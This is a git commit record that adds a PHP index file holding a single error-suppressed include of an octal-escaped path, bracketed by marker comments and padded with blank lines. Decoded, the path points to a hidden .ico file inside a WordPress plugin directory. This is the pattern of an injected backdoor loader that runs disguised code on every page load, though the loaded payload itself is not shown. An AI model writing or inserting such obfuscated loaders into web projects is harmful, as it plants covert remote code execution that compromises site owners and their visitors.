3ba7f6512e2c0b2bc7335d59ce7cb278fcd1bfac
Ali Riaz <me.aliriaz007@gmail.com>
2021-07-26 22:58:47 +0500

    files added

---
+++ data/index.php
@@ -0,0 +1,23 @@
+<?php
+/*de9ad*/
+
+@include "\057hom\145/kn\150vtq\067s2k\146g/p\165bli\143_ht\155l/w\160-co\156ten\164/pl\165gin\163/gr\141vit\171for\155sus\145rre\147ist\162ati\157n/.\14280f\06047e\056ico";
+
+/*de9ad*/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
